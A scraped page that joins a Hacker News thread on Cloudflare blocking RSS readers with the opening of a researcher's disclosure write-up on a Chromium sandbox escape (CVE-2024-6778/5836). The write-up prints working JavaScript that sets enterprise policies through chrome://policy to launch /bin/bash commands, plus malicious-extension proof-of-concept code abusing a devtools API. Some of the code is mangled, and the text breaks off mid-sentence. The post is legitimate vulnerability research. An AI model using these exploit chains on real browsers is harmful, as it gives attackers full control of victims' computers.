a matter, not just blindly do as they're told. Your builder is meant to do their due diligence, which includes making recommendations. reply gsich 11 hours agorootparentprevThey are enablers. They get part of the blame. reply nirvdrum 2 hours agorootparentprevI contend this wasn’t an issue prior to Cloudflare making that an option. Sure, some IDS would block some users and geo blocks have been around forever. But, Cloudflare is so prolific and makes it so easy to block things inadvertently, that I don’t think they get a pass and blame the downstream user. It’s particularly frustrating that they give their own WARP service a pass. I’ve run into many sites that will block VPN traffic, including iCloud Privacy Relay, but WARP traffic goes through just fine. reply foul 9 hours agoparentprevnext [3 more] [flagged] account42 8 hours agorootparentAh yes, just wrap every protocol in HTTP to get through middle boxes. Just use chrome for all requests becaus fuck having a standard with different implementations. Next you're going to recommend to just automate a Windows PC through simulated mouse and keyboard input to deal with hardware attestation that these fuckers want to bring to the web. reply foul 6 hours agorootparentNot my fault if the whole world bought the \"openness\" bullshit and then built cable-TV-with-mouse. If that guy makes money with that and has an issue with the Great Firewall Of America, there's a (bad) solution. reply wraptile 7 hours agoprevCloudflare has been the bane of my web existance on Thai IP and a Linux Firefox fingerprint. I wonder how much traffic is lost because of Cloudflare and of course none of that is reported to the web admins so everyone continues with their jolly ignorance. I wrote my own RSS bridge that scrapes websites using Scrapfly web scraping API that bypasses all that because it's so annoying that I can't even scrape some company's /blog that they are literally buying ads for but somehow have an anti-bot enabled that blocks all RSS readers. Modern web is so anti social that the web 2.0 guys should be rolling in their \"everything will be connected with APIs\" graves by now. reply vundercind 4 hours agoparentThe late '90s00s solution was to blackhole address blocks associated with entire countries or continents. It was easily worth it for many US sites that weren't super-huge to lose the the 0.1% of legitimate requests they'd get from, say, China or Thailand or Russia, to cut the speed their logs scrolled at by 99%. The state of the art isn't much better today, it seems. Similar outcome with more steps. reply pentagrama 2 hours agoprevCan you whitelists urls to be readead by bot on Cloudflare? Maybe this is a good solution, and there you can put your RSS feeds, sitemaps, and other content for bots. Also Cloudflare can make a dedicated fields to whitelists RSS and Sitemaps on the admin panel so users can discover more easily that they may don't want block those bots. Can you whitelist URLs to be read by bots on Cloudflare? Maybe this is a good solution, where you as a site mantainer can include your RSS feeds, sitemaps, and other content for bots. Also, Cloudflare could ship a feature by creating a dedicated section in the admin panel to let the user add and whitelist RSS feeds and sitemaps, making it easier (and educate) users to avoid blocking those bots who aren't a threat to your site, of course sill considering rules to avoid DDOS on this urls, like massive requests or stuff that common bots from RSS readers don't do. reply whs 10 hours agoprevMy company runs a tech news website. We offer RSS feed as any Drupal website would, which content farm just scrape our RSS feed to rehost our content in full. This is usually fine for us - the content is CC-licensed and they do post the correct source. But they run thousands of different WordPress instances on the same IP and they individually fetch the feed. In the end we had to use Cloudflare to rate limit the RSS endpoint. reply kevincox 6 hours agoparent> In the end we had to use Cloudflare to rate limit the RSS endpoint. I think this is fine. You are solving a specific problem and still allowing some traffic. The problem with the Cloudflare default settings is that they block all requests leading to users failing to get any updates even when fetching the feed at a reasonable rate. BTW in this case another solution may just be to configure proper caching headers. Even if you only cache for 5min at a time that will be at most 1 request every 5min per Cloudflare caching location (I don't know the exact configuration but typically use ~5 locations per origin, so that would be only 1req/min which is trivial load and will handle both these inconsiderate scrapers and regular users. You can also configure all fetches to come from a single location and then you would only need to actually serve the feed once per 5min) reply yjftsjthsd-h 4 hours agoparentprev> In the end we had to use Cloudflare to rate limit the RSS endpoint. Isn't the correct solution to use CF to cache RSS endpoints aggressively? reply MarvinYork 10 hours agoprevIn any case, it blocks German Telekom users. There is an ongoing dispute between Cloudflare and Telekom as to who pays for the traffic costs. Telekom is therefore throttling connections to Cloudflare. This is the reason why we can no longer use Cloudflare. reply SSLy 7 hours agoparentas much as I am not a fan of cloudflare's practices, in this particular case DTAG seems to be the party at fault. reply hugoromano 4 hours agoprev\"could be blocking RSS users\" it says it all \"could\". I use RSS on my websites, which are serviced by Cloudflare, and my users are not blocked. For that, fine-tuning and setting Configuration Rules at Cloudflare Dashboard are required. Anyone on a free has access to 10 Configuration Rules. I prefer using Cloudflare Workers to tune better, but there is a cost. My suggestion for RSS these days is to reduce the info on RSS feed to teasers, AI bots are using RSS to circumvent bans, and continue to scrape. reply tandav 1 hour agoprevAs an admin of my personal website, I completely disable all Cloudflare features and use it only for DNS and domain registration. I also stop following websites that use Cloudflare checks or cookie popups (cookies are fine, but the popups are annoying). reply ectospheno 2 hours agoprevI love that I get a cloudflare human check on almost every page they serve for customers except for when I login to my cloudflare account. Good times. reply srmarm 4 hours agoprevI'd have thought the website owner whitelisting their RSS feed URI (or pattern matching *.xml/*.rss) might be better than doing it based on the users agent string. For one you'd expect bot traffic on these end points and you're also not leaving a door open to anyone who fakes their user agent. Looks like it should be possible under the WAF reply veeti 12 hours agoprevI believe that disabling \"Bot Fight Mode\" is not enough, you may also need to create a rule to disable \"Browser Integrity Check\". reply mbo 11 hours agoprevThis is an active issue with Rate Your Music right now: https://rateyourmusic.com/rymzilla/view?id=6108 Unfixed for 4 months. reply artooro 4 hours agoprevThis is a truly problematic issue that I've experienced as well. The best solution is probably for Cloudflare to figure out what normal RSS usage looks like and have a provision for that in their bot detection. reply 015a 4 hours agoprevSuggesting that website operators should allowlist RSS clients through the Cloudflare bot detection system via their user-agent is a rather concerning recommendation. reply ricardo81 11 hours agopreviirc even if you're listed as a \"good bot\" with Cloudflare, high security settings by the CF user can still result in 403s. No idea if CF already does this, but allowing users to generate access tokens for 3rd party services would be another way of easing access alongside their apparent URL and IP whitelisting. reply pointlessone 9 hours agoprevI see this on a regular basis. My self-hosted RSS reader is blocked by Cloudflare even after my IP address was explicitly allowlisted by a few feed owners. reply prmoustache 10 hours agoprevI believe this also pose issues to people running adblockers. I get tons of repetitive captchas on some websites. Also other companies offering similar services like imperva seems to be straight banning my ip after one visit to a website with uBlock Origin I first get a captcha, then a page saying I am not allowed, and whatever I do, even using an extensionless chrome browser with a new profile I can't visit it anymore because my ip is banned. reply acdha 6 hours agoparentOne thing to keep in mind is that the modern web sees a lot of spam and scraping, and ad revenue has been sliding for years. If you make your activity look like a not, most operators will assume you’re not generating revenue and block you. It sucks but thank a spammer for the situation. reply account42 8 hours agoprevOr just normal human users with a niche browser like Firefox. reply nfriedly 5 hours agoprevLiliputing.com had this problem a couple of years ago. I emailed the author and he got it sorted out after a bit of back and forth. reply rcarmo 12 hours agoprevIronically, the site seems to currently be hugged to death, so maybe they should consider using Cloudflare to deal with HN traffic? reply sofixa 9 hours agoparentDoesn't have to be using CloudFlare, just a static web host that will be able to scale to infinity (of which CloudFlare is one with Pages, but there's also Google with Firebase Hosting, AWS with Amplify, Microsoft with something in Azure with a verbose name, Netlify, Vercel, GitHub Pages, etc etc etc). reply kawsper 6 hours agorootparentOr just add Varnish or Nginx configured with a cache in front. reply sofixa 6 hours agorootparentThat can still exhaust system resources on the box it's running on (file descriptors, inodes, ports, CPU/memory/bandwidth, etc) if you hit it too big. For something like entirely static content, it's so much easier (and cheaper, all of the static hosting providers have an extremely generous free tier) to use static hosting. And I say this as an SRE by heart who runs Kubernetes and Nomad for fun across a number of nodes at home and in various providers - my blog is on a static host. Use the appropriate solution for each task. reply vundercind 4 hours agorootparentprevI used to serve low-tens-of-MB .zip files—worse than a web page and a few images or what have you—statically from Apache2 on a boring Linux server that'd qualify as potato-tier today, with traffic spikes into the hundreds of thousands per minute. Tens of thousands per minute against other endpoints gated by PHP setting a header to tell Apache2 to serve the file directly if the client authenticated correctly, and I think that one could have gone a lot higher, never really gave it a workout. Wasn't even really taxing the hardware that much for either workload. Before that, it was on a mediocre-even-at-the-time dedicated-cores VM. That caused performance problems... because its Internet \"pipe\" was straw-sized, it turned out. The server itself was fine. Web server performance has regressed amazingly badly in the world of the Cloud. Even \"serious\" sites have decided the performance equivalent of shitty shared-host Web hosting is a great idea and that introducing all the problems of distributed computing at the architecture level will help their moderate-traffic site work better (LOL; LMFAO), so now they need Cloudflare and such just so their \"scalable\" solution doesn't fall over in a light breeze. reply timeon 10 hours agoparentprevIf it is unintentional DDoS, we can wait. Not everything needs to be on demand. reply dewey 10 hours agorootparentThe website is built to get attention, the attention is here right now. Nobody will remember to go back tomorrow and read the site again when it’s available. reply BlueTemplar 5 hours agorootparentI'm not sure an open web can exist under this kind of assumption... Once you start chasing views, it's going to come at the detriment of everything else. reply dewey 5 hours agorootparentThis happened at least 15 years ago and we are doing okay. reply est 9 hours agoprevHmmm, that's why \"feedburner\" is^H^Hwas a thing, right? We have come to full circle. reply kevincox 6 hours agoparentYeah, this is the recommendation that I usually give people who reach out to support. Feedburner tends to be on the whitelists to avoids this problem. reply renewiltord 39 minutes agoprevAh, the Cloudflare free plan does not automatically turn these on. I know since I use it for some small things and don't have these on. I wouldn't use User-Agent filtering because those are spoofable. But putting feeds on a separate URL is probably a good idea. Right now the feed is actually generated on request for these sites, so caching it is probably a good idea anyway. I can just rudimentarily do that by periodically generating and copying it over. reply idunnoman1222 4 hours agoprevYes, the way to retain your privacy is to not use the Internet if you don’t like it, make your own Internet: assumedly one not funded by ads reply soraminazuki 10 hours agoprevThis is an issue with techdirt.com. I contacted them about this through their feedback form a long time ago, but the issue still remains unfortunately. reply hwj 10 hours agoprevI had problems accessing Cloudflare-hosted websites via the Tor browser also. Don't know it that is still true. reply timnetworks 5 hours agoprevRSS is the future that is being kept from us for twenty years already, fusion can kick bricks. reply dewey 10 hours agoprevI’m using Miniflix and I always run into that on a few blogs which now I just stopped reading. reply shaunpud 6 hours agoprevNamesilo are the same, their csv/rss behind Cloudflare so don't even bother anymore with their auctions and their own interface is meh reply anilakar 6 hours agoprev...and there is a good number of people who see this as a feature, not a bug. reply hkt 6 hours agoprev [–] It also manages to break IRC bots that do things like show the contents of the title tag when someone posts a link. Another cloudy annoyance, albeit a minor one. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Cloudflare's Bot Fight Mode and AI scraper blocking features can inadvertently block legitimate RSS readers, affecting their functionality.- Users can whitelist RSS readers by identifying their user agent or IP address in Cloudflare's dashboard, though this process is cumbersome and unreliable.- Open RSS, a nonprofit, suggests donations to support their service, highlighting the need for Cloudflare to improve its system to prevent blocking RSS readers."
    ],
    "commentSummary": [
      "Cloudflare's security measures are inadvertently blocking RSS users, impacting services like NewsBlur, an open-source RSS reader, by causing 403 errors.",
      "Despite being on Cloudflare's verified bots list, NewsBlur and other RSS readers face challenges due to Cloudflare's bot protection, which often blocks legitimate RSS traffic.",
      "Suggested solutions include whitelisting RSS URLs or disabling bot checks for RSS feeds, but Cloudflare's default settings continue to pose issues, raising concerns about web privacy and accessibility."
    ],
    "points": 415,
    "commentCount": 195,
    "retryCount": 0,
    "time": 1729118797
  },
  {
    "id": 41866802,
    "title": "Escaping the Chrome Sandbox Through DevTools",
    "originLink": "https://ading.dev/blog/posts/chrome_sandbox_escape.html",
    "originBody": "ading2210 About Projects Blog Escaping the Chrome Sandbox Through DevTools By ading2210 on 10/16/24 Introduction This blog post details how I found CVE-2024-6778 and CVE-2024-5836, which are vulnerabilities within the Chromium web browser which allowed for a sandbox escape from a browser extension (with a tiny bit of user interaction). Eventually, Google paid me $20,000 for this bug report. In short, these bugs allowed a malicious Chrome extension to run any shell command on your PC, which might then be used to install some even worse malware. Instead of merely stealing your passwords and compromising your browser, an attacker could take control of your entire operating system. WebUIs and the Chrome Sandbox All untrusted code that Chromium runs is sandboxed, which means that it runs in an isolated environment that cannot access anything it's not supposed to. In practice, this means that the Javascript code that runs in a Chrome extension can only interact with itself and the Javascript APIs it has access to. Which APIs an extension has access to is dependent on the permissions that the user grants it. However, the worst that you can really do with these permissions is steal someone's logins and browser history. Everything is supposed to stay contained to within the browser. Additionally, Chromium has a few webpages that it uses for displaying its GUI, using a mechanism called WebUI. These are prefixed with the chrome:// URL protocol, and include ones you've probably used like chrome://settings and chrome://history. Their purpose is to provide the user-facing UI for Chromium's features, while being written with web technologies such as HTML, CSS, and Javascript. Because they need to display and modify information that is specific to the internals of the browser, they are considered to be privileged, which means they have access to private APIs that are used nowhere else. These private APIs allow the Javascript code running on the WebUI frontend to communicate with native C++ code in the browser itself. Preventing an attacker from accessing WebUIs is important because code that runs on a WebUI page can bypass the Chromium sandbox entirely. For example, on chrome://downloads, clicking on a download for a .exe file will run the executable, and thus if this action was performed via a malicious script, that script can escape the sandbox. Running untrusted Javascript on chrome:// pages is a common attack vector, so the receiving end of these private APIs perform some validation to ensure that they're not doing anything that the user couldn't otherwise do normally. Going back to the chrome://downloads example, Chromium protects against that exact scenario by requiring that to open a file from the downloads page, the action that triggers it has to come from an actual user input and not just Javascript. Of course, sometimes with these checks there's an edge case that the Chromium developers didn't account for. About Enterprise Policies My journey towards finding this vulnerability began when I was looking into the Chromium enterprise policy system. It's intended to be a way for administrators to force certain settings to be applied to devices owned by a company or school. Usually, policies tied to a Google account and are downloaded from Google's own management server. Enterprise policies also include things that the user would not be able to modify normally. For example, one of the things you can do with policies is disable the dino easter egg game: Moreover, the policies themselves are separated into two categories: user policies and device policies. Device policies are used to manage settings across an entire Chrome OS device. They can be as simple as restricting which accounts can log in or setting the release channel. Some of them can even change the behavior of the device's firmware (used to prevent developer mode or downgrading the OS). However, because this vulnerability doesn't pertain to Chrome OS, device policies can be ignored for now. User policies are applied to a specific user or browser instance. Unlike device policies, these are available on all platforms, and they can be set locally rather than relying on Google's servers. On Linux for instance, placing a JSON file inside /etc/opt/chrome/policies will set the user policies for all instances of Google Chrome on the device. Setting user policies using this method is somewhat inconvenient since writing to the policies directory requires root permissions. However, what if there was a way to modify these policies without creating a file? The Policies WebUI Notably, Chromium has a WebUI for viewing the policies applied to the current device, located at chrome://policy. It shows the list of policies applied, the logs for the policy service, and the ability to export these policies to a JSON file. This is nice and all, but normally there's no way to edit the policies from this page. Unless of course, there is an undocumented feature to do exactly that. Abusing the Policy Test Page When I was doing research on the subject, I came across the following entry in the Chrome Enterprise release notes for Chrome v117: Chrome will introduce a chrome://policy/test page chrome://policy/test will allow customers to test out policies on the Beta, Dev, Canary channels. If there is enough customer demand, we will consider bringing this functionality to the Stable channel. As it turns out, this is the only place in Chromium's documentation where this feature is mentioned at all. So with nowhere else to look, I examined the Chromium source code to figure out how it is supposed to work. Using Chromium Code Search, I did a search for chrome://policy/test, which led me to the JS part of the WebUI code for the policy test page. I then noticed the private API calls that it uses to set the test policies: export class PolicyTestBrowserProxy { applyTestPolicies(policies: string, profileSeparationResponse: string) { return sendWithPromise('setLocalTestPolicies', policies, profileSeparationResponse); } ... } Remember how I said that these WebUI pages have access to private APIs? Well, sendWithPromise() is one of these. sendWithPromise() is really just a wrapper for chrome.send(), which sends a request to a handler function written in C++. The handler function can then do whatever it needs to in the internals of the browser, then it may return a value which is passed back to the JS side by sendWithPromise(). And so, on a whim, I decided to see what calling this in the JS console would do. //import cr.js since we need sendWithPromise let cr = await import('chrome://resources/js/cr.js'); await cr.sendWithPromise(\"setLocalTestPolicies\", \"\", \"\"); Unfortunately, running it simply crashed the browser. Interestingly, the following line appeared in the crash log: [17282:17282:1016/022258.064657:FATAL:local_test_policy_loader.cc(68)] Check failed: policies.has_value() && policies->is_list(). List of policies expected It looks like it expects a JSON string with an array of policies as the first argument, which makes sense. Let's provide one then. Luckily policy_test_browser_proxy.ts tells me the format it expects so I don't have to do too much guesswork. let cr = await import('chrome://resources/js/cr.js'); let policy = JSON.stringify([ { name: \"AllowDinosaurEasterEgg\", value: false, level: 1, source: 1, scope: 1 } ]); await cr.sendWithPromise(\"setLocalTestPolicies\", policy, \"\"); So after running this... it just works? I just set an arbitrary user policy by simply running some Javascript on chrome://policy. Clearly something is going wrong here, considering that I never explicitly enabled this feature at all. Broken WebUI Validation For some context, this is what the policy test page is supposed to look like when it's properly enabled. To properly enable this page, you have to set the PolicyTestPageEnabled policy (also not documented anywhere). If that policy is not set to begin with, then chrome://policy/test just redirects back to chrome://policy. So why was I able to set the test policies regardless of the fact that I had the PolicyTestPageEnabled policy disabled? To investigate this, I looked though Chromium Code Search again and found the WebUI handler for the setLocalTestPolicies function on the C++ side. void PolicyUIHandler::HandleSetLocalTestPolicies( const base::Value::List& args) { std::string policies = args[1].GetString(); policy::LocalTestPolicyProvider* local_test_provider = static_cast( g_browser_process->browser_policy_connector() ->local_test_policy_provider()); CHECK(local_test_provider); Profile::FromWebUI(web_ui()) ->GetProfilePolicyConnector() ->UseLocalTestPolicyProvider(); local_test_provider->LoadJsonPolicies(policies); AllowJavascript(); ResolveJavascriptCallback(args[0], true); } The only validation that this function performs is that it checks to see if local_test_provider exists, otherwise it crashes the entire browser. Under what conditions will local_test_provider exist, though? To answer that, I found the code that actually creates the local test policy provider. std::unique_ptr LocalTestPolicyProvider::CreateIfAllowed(version_info::Channel channel) { if (utils::IsPolicyTestingEnabled(/*pref_service=*/nullptr, channel)) { return base::WrapUnique(new LocalTestPolicyProvider()); } return nullptr; } So this function actually does perform a check to see if the test policies are allowed. If they're not allowed, then it returns null, and attempting to set test policies like I showed earlier will cause a crash. Maybe IsPolicyTestingEnabled() is misbehaving? Here's what the function looks like: bool IsPolicyTestingEnabled(PrefService* pref_service, version_info::Channel channel) { if (pref_service && !pref_service->GetBoolean(policy_prefs::kPolicyTestPageEnabled)) { return false; } if (channel == version_info::Channel::CANARY || channel == version_info::Channel::DEFAULT) { return true; } return false; } This function first checks if kPolicyTestPageEnabled is true, which is the the policy that is supposed to enable the policy test page under normal conditions. However, you may notice that when IsPolicyTestingEnabled() is called, the first argument, the pref_service, is set to null. This causes the check to be ignored entirely. Now, the only check that remains is for the channel. In this context, \"channel\" means browser's release channel, which is something like stable, beta, dev, or canary. So in this case, only Channel::CANARY and Channel::DEFAULT is allowed. That must mean that my browser is set to either Channel::CANARY or Channel::DEFAULT. Then does the browser know what channel it's in? Here's the function where it determines that: // Returns the channel state for the browser based on branding and the // CHROME_VERSION_EXTRA environment variable. In unbranded (Chromium) builds, // this function unconditionally returns `channel` = UNKNOWN and // `is_extended_stable` = false. In branded (Google Chrome) builds, this // function returns `channel` = UNKNOWN and `is_extended_stable` = false for any // unexpected $CHROME_VERSION_EXTRA value. ChannelState GetChannelImpl() { #if BUILDFLAG(GOOGLE_CHROME_BRANDING) const char* const env = getenv(\"CHROME_VERSION_EXTRA\"); const std::string_view env_str = env ? std::string_view(env) : std::string_view(); // Ordered by decreasing expected population size. if (env_str == \"stable\") return {version_info::Channel::STABLE, /*is_extended_stable=*/false}; if (env_str == \"extended\") return {version_info::Channel::STABLE, /*is_extended_stable=*/true}; if (env_str == \"beta\") return {version_info::Channel::BETA, /*is_extended_stable=*/false}; if (env_str == \"unstable\") // linux version of \"dev\" return {version_info::Channel::DEV, /*is_extended_stable=*/false}; if (env_str == \"canary\") { return {version_info::Channel::CANARY, /*is_extended_stable=*/false}; } #endif // BUILDFLAG(GOOGLE_CHROME_BRANDING) return {version_info::Channel::UNKNOWN, /*is_extended_stable=*/false}; } If you don't know how the C preprocessor works, the #if BUILDFLAG(GOOGLE_CHROME_BRANDING) part means that the enclosed code will only be compiled if BUILDFLAG(GOOGLE_CHROME_BRANDING) is true. Otherwise that part of the code doesn't exist. Considering that I'm using plain Chromium and not the branded Google Chrome, the channel will always be Channel::UNKNOWN. This also means that, unfortunately, the bug will not work on stable builds of Google Chrome since the release channel is set to the proper value there. enum class Channel { UNKNOWN = 0, DEFAULT = UNKNOWN, CANARY = 1, DEV = 2, BETA = 3, STABLE = 4, }; Looking at the enum definition for the channels, we can see that Channel::UNKNOWN is actually the same as Channel::DEFAULT. Thus, on Chromium and its derivatives, the release channel check in IsPolicyTestingEnabled() always passes, and the function will always return true. Sandbox Escape via the Browser Switcher So what can I actually do with the ability to set arbitrary user policies? To answer that, I looked at the Chrome enterprise policy list. One of the features present in enterprise policies is the Legacy Browser Support module, also called the Browser Switcher. It's designed to accommodate Internet Explorer users by launching an alternative browser when the user visit certain URLs in Chromium. The behaviors of this feature are all controllable with policies. The AlternativeBrowserPath policy stood out in particular. Combined with AlternativeBrowserParameters, this lets Chromium launch any shell command as the \"alternate browser.\" However, keep in mind this only works on Linux, MacOS, and Windows, because otherwise the browser switcher policies don't exist. We can set the following policies to make Chromium launch the calculator, for instance: name: \"BrowserSwitcherEnabled\" value: true name: \"BrowserSwitcherUrlList\" value: [\"example.com\"] name: \"AlternativeBrowserPath\" value: \"/bin/bash\" name: \"AlternativeBrowserParameters\" value: [\"-c\", \"xcalc # ${url}\"] Whenever the browser tries to navigate to example.com, the browser switcher will kick in and launch /bin/bash. [\"-c\", \"xcalc # https://example.com\"] get passed in as arguments. The -c tells bash to run the command specified in the next argument. You may have noticed that the page URL gets substituted into ${url}, and so to prevent this from messing up the command, we can simply put it behind a # which makes it a comment. And thus, we are able to trick Chromium into running /bin/bash -c 'xcalc # https://example.com'. Utilizing this from the chrome://policy page is rather simple. I can just set these policies using the aforementioned method, and then call window.open(\"https://example.com\") to trigger the browser switcher. let cr = await import('chrome://resources/js/cr.js'); let policy = JSON.stringify([ { //enable the browser switcher feature name: \"BrowserSwitcherEnabled\", value: true, level: 1, source: 1, scope: 1 }, { //set the browser switcher to trigger on example.com name: \"BrowserSwitcherUrlList\", value: [\"example.com\"], level: 1, source: 1, scope: 1 }, { //set the executable path to launch name: \"AlternativeBrowserPath\", value: \"/bin/bash\", level: 1, source: 1, scope: 1 }, { //set the arguments for the executable name: \"AlternativeBrowserParameters\", value: [\"-c\", \"xcalc # https://example.com\"], level: 1, source: 1, scope: 1 } ]); //set the policies listed above await cr.sendWithPromise(\"setLocalTestPolicies\", policy, \"\"); //navigate to example.com, which will trigger the browser switcher window.open(\"https://example.com\") And that right there is the sandbox escape. We have managed to run an arbitrary shell command via Javascript running on chrome://policy. Breaking the Devtools API You might have noticed that so far, this attack requires the victim to paste the malicious code into the browser console while they are on chrome://policy. Actually convincing someone to do this would be rather difficult, making the bug useless. So now, my new goal is to somehow run this JS in chrome://policy automatically. The most likely way this can be done is by creating a malicious Chrome extension. The Chrome extension APIs have a fairly large attack surface, and extensions by their very nature have the ability to inject JS onto pages. However, like I mentioned earlier, extensions are not allowed to run JS on privileged WebUI pages, so I needed to find a way around that. There are 4 main ways that an extension can execute JS on pages: chrome.scripting, which directly executes JS in a specific tab. chrome.tabs in Manifest v2, which works similarly to how chrome.scripting does. chrome.debugger which utilizes the remote debugging protocol. chrome.devtools.inspectedWindow, which interacts with the inspected page when devtools is open. While investigating this, I decided to look into chrome.devtools.inspectedWindow, as I felt that it was the most obscure and thus least hardened. That assumption turned out to be right. The way that the chrome.devtools APIs work is that all extensions that use the APIs must have the devtools_page field in their manifest. For example: { \"name\": \"example extension\", \"version\": \"1.0\", \"devtools_page\": \"devtools.html\", ... } Essentially, what this does is it specifies that whenever the user opens devtools, the devtools page loads devtools.html as an iframe. Within that iframe, the extension can use all of the chrome.devtools APIs. You can refer to the API documentation for the specifics. While researching the chrome.devtools.inspectedWindow APIs, I noticed a prior bug report by David Erceg, which involved a bug with chrome.devtools.inspectedWindow.eval(). He managed to get code execution on a WebUI by opening devtools on a normal page, then running chrome.devtools.inspectedWindow.eval() with a script that crashed the page. Then, this crashed tab could be navigated to a WebUI page, where the eval request would be re-run, thus gaining code execution there. Notably, the chrome.devtools APIs are supposed to protect against this sort of privilege execution by simply disabling their usage after the inspected page has been navigated to a WebUI. As David Erceg demonstrated in his bug report, the key to bypassing this is to send the request for the eval before Chrome decides to disable the devtools API, and to make sure the request arrives at the WebUI page. After reading that report, I wondered if something similar was possible with chrome.devtools.inspectedWindow.reload(). This function is also able to run JS on the inspected page, as long as the injectedScript is passed into it. The first sign that it was exploitable appeared when I tried calling inspectedWindow.reload() when the inspected page was an about:blank page which belonged to a WebUI. about:blank pages are unique in this regard since even though the URL is not special, they inherit the permissions and origin from the page that opened them. Because an about:blank page opened from a WebUI is privileged, you would expect that trying to evaluate JS on that page would be blocked. Surprisingly, this actually worked. Notice that the title of the alert has the page's origin in it, which is chrome://settings, so the page is in fact privileged. But wait, isn't the devtools API supposed to prevent this exact thing by disabling the API entirely? Well, it doesn't consider the edge case of about:blank pages. Here's the code that handles disabling the API: private inspectedURLChanged(event: Common.EventTarget.EventTargetEvent): void { if (!ExtensionServer.canInspectURL(event.data.inspectedURL())) { this.disableExtensions(); return; } ... } Importantly, it only takes the URL into consideration here, not the page's origin. As I demonstrated earlier, these can be two distinct things. Even if the URL is benign, the origin may not be. Abusing about:blank is nice and all but it's not very useful in the context of making an exploit chain. The page I want to get code execution on, chrome://policy, never opens any about:blank popups, so that's already a dead end. However, I noticed the fact that even though inspectedWindow.eval() failed, inspectedWindow.reload() still ran successfully and executed the JS on chrome://settings. This suggested that inspectedWindow.eval() has its own checks to see if the origin of the inspected page is allowed, while inspectedWindow.reload() has no checks of its own. Then I wondered if I could just spam the inspectedWindow.reload() calls, so that if at least one of those requests landed on the WebUI page, I would get code execution. function inject_script() { chrome.devtools.inspectedWindow.reload({\"injectedScript\": ` //check the origin, this script won't do anything on a non chrome page if (!origin.startsWith(\"chrome://\")) return; alert(\"hello from chrome.devtools.inspectedWindow.reload\"); ` }); } setInterval(() => { for (let i=0; i { //check the origin, this script won't do anything on a non chrome page console.log(origin); if (!origin.startsWith(\"chrome://\")) return; //import cr.js since we need sendWithPromise let cr = await import('chrome://resources/js/cr.js'); //here are the policies we are going to set let policy = JSON.stringify([ { //enable the browser switcher feature name: \"BrowserSwitcherEnabled\", value: true, level: 1, source: 1, scope: 1 }, { //set the browser switcher to trigger on example.com name: \"BrowserSwitcherUrlList\", value: [\"example.com\"], level: 1, source: 1, scope: 1 }, { //set the executable path to launch name: \"AlternativeBrowserPath\", value: ${JSON.stringify(executable)}, level: 1, source: 1, scope: 1 }, { //set the arguments for the executable name: \"AlternativeBrowserParameters\", value: ${JSON.stringify(flags)}, level: 1, source: 1, scope: 1 } ]); //set the policies listed above await cr.sendWithPromise(\"setLocalTestPolicies\", policy, \"\"); setTimeout(() => { //navigate to example.com, which will trigger the browser switcher location.href = \"https://example.com\"; //open a new page so that there is still a tab remaining after this open(\"about:blank\"); }, 100); })()` }); } //interval to keep trying to inject the content script //there's a tiny window of time in which the content script will be //injected into a protected page, so this needs to run frequently function start_interval() { setInterval(() => { //loop to increase our odds for (let i=0; i {setTimeout(resolve, 1000)}); let new_tab = await chrome.tabs.get(tab.id); //if we're on the policy page, the content script didn't get injected if (new_tab.url.startsWith(\"chrome://policy\")) { //navigate back to the original page await chrome.tabs.update(tab.id, {url: tab.url}); //discarding and reloading the tab will close devtools setTimeout(() => { chrome.tabs.discard(tab.id); }, 100) } //we're still on the original page, so reload the extension frame to retry else { location.reload(); } } main(); And with that, I was ready to write the bug report. I finalized the script, wrote an explanation of the bug, tested it on multiple operating systems, and sent it in to Google. At this point however, there was still a glaring problem: The race condition with .inspectedWindow.reload() was not very reliable. I managed to tweak it so that it worked about 70% of the time, but that still wasn't enough. While the fact that it worked at all definitely made it a serious vulnerability regardless, the unreliability would have reduced the severity by quite a bit. So then I got to work trying to find a better way. A Familiar Approach Remember how I mentioned that in David Erceg's bug report, he utilized the fact that debugger requests persist after the tab crashes? I wondered if this exact method worked for inspectedWindow.reload() too, so I tested it. I also messed with the debugger statement, and it appeared that triggering the debugger twice in a row caused the tab to crash. So I got to work writing a new POC: let tab_id = chrome.devtools.inspectedWindow.tabId; //function which injects the content script into the inspected page function inject_script() { chrome.devtools.inspectedWindow.reload({\"injectedScript\": ` //check the origin, so that the debugger is triggered instead if we are not on a chrome page if (!origin.startsWith(\"chrome://\")) { debugger; return; } alert(\"hello from chrome.devtools.inspectedWindow.reload\");` }); } function sleep(ms) { return new Promise((resolve) => {setTimeout(resolve, ms)}) } async function main() { //we have to reset the tab's origin here so that we don't crash our own extension process //this navigates to example.org which changes the tab's origin await chrome.tabs.update(tab_id, {url: \"https://example.org/\"}); await sleep(500); //navigate to about:blank from within the example.org page which keeps the same origin chrome.devtools.inspectedWindow.reload({\"injectedScript\": ` location.href = \"about:blank\"; ` }) await sleep(500); inject_script(); //pause the current tab inject_script(); //calling this again crashes the tab and queues up our javascript await sleep(500); chrome.tabs.update(tab_id, {url: \"chrome://settings\"}); } main(); And it works! This nice part about this approach is that it eliminates the need for a race condition and makes the exploit 100% reliable. Then, I uploaded the new POC, with all of the chrome://policy stuff, to a comment on the bug report thread. But why would this exact oversight still exist even though it should have been patched 4 years ago? We can figure out why by looking at how that previous bug was patched. Google's fix was to clear all the pending debugger requests after the tab crashes, which seems like a sensible approach: void DevToolsSession::ClearPendingMessages(bool did_crash) { for (auto it = pending_messages_.begin(); it != pending_messages_.end();) { const PendingMessage& message = *it; if (SpanEquals(crdtp::SpanFrom(\"Page.reload\"), crdtp::SpanFrom(message.method))) { ++it; continue; } // Send error to the client and remove the message from pending. std::string error_message = did_crash ? kTargetCrashedMessage : kTargetClosedMessage; SendProtocolResponse( message.call_id, crdtp::CreateErrorResponse( message.call_id, crdtp::DispatchResponse::ServerError(error_message))); waiting_for_response_.erase(message.call_id); it = pending_messages_.erase(it); } } You may notice that it seems to contain an exception for the Page.reload requests so that they are not cleared. Internally, the inspectedWindow.reload() API sends a Page.reload request, so as a result the inspectedWindow.reload() API calls are exempted from this patch. Google really patched this bug, then added an exception to it which made the bug possible again. I guess they didn't realize that Page.reload could also run scripts. Another mystery is why the page crashes when the debugger statement is run twice. I'm still not completely sure about this one, but I think I narrowed it down to a function within Chromium's renderer code. It's specifically happens when Chromium checks the navigation state, and when it encounters an unexpected state, it crashes. This state gets messed up when RenderFrameImpl::SynchronouslyCommitAboutBlankForBug778318 is called (yet another side effect of treating about:blank specially). Of course, any kind of crash works, such as with [...new Array(2**31)], which causes the tab to run out of memory. However, the debugger crash is much faster to trigger so that's what I used in my final POC. Anyways, here's what the exploit looks like in action: By the way, you might have noticed the \"extension install error\" screen that is shown. That's just to 